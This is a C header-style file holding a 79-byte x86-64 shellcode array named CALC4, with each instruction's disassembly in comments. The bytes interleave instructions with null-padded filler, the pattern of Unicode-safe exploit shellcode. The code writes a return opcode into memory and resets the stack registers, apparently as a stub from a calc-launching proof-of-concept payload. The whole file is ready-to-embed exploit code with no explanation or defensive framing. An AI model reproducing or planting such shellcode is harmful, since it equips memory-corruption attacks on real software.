
// Target architecture : X86 64

#define CALC4_SIZE 79

char CALC4[] = {
  /* 0000 */ "\x59"                 /* pop  rcx                  */
  /* 0001 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0004 */ "\x59"                 /* pop  rcx                  */
  /* 0005 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0008 */ "\x59"                 /* pop  rcx                  */
  /* 0009 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 000C */ "\x59"                 /* pop  rcx                  */
  /* 000D */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0010 */ "\x59"                 /* pop  rcx                  */
  /* 0011 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0014 */ "\x59"                 /* pop  rcx                  */
  /* 0015 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0018 */ "\xb8\x00\x4d\x00\xff" /* mov  eax, 0xff004d00      */
  /* 001D */ "\x00\xe1"             /* add  cl, ah               */
  /* 001F */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0022 */ "\x51"                 /* push rcx                  */
  /* 0023 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0026 */ "\x58"                 /* pop  rax                  */
  /* 0027 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 002A */ "\xc6\x00\xc3"         /* mov  byte ptr [rax], 0xc3 */
  /* 002D */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0030 */ "\x59"                 /* pop  rcx                  */
  /* 0031 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0034 */ "\x5b"                 /* pop  rbx                  */
  /* 0035 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0038 */ "\x5e"                 /* pop  rsi                  */
  /* 0039 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 003C */ "\x5f"                 /* pop  rdi                  */
  /* 003D */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0040 */ "\x59"                 /* pop  rcx                  */
  /* 0041 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0044 */ "\x6a\x00"             /* push 0                    */
  /* 0046 */ "\x58"                 /* pop  rax                  */
  /* 0047 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 004A */ "\x5c"                 /* pop  rsp                  */
  /* 004B */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 004E */ "\x5d"                 /* pop  rbp                  */
};
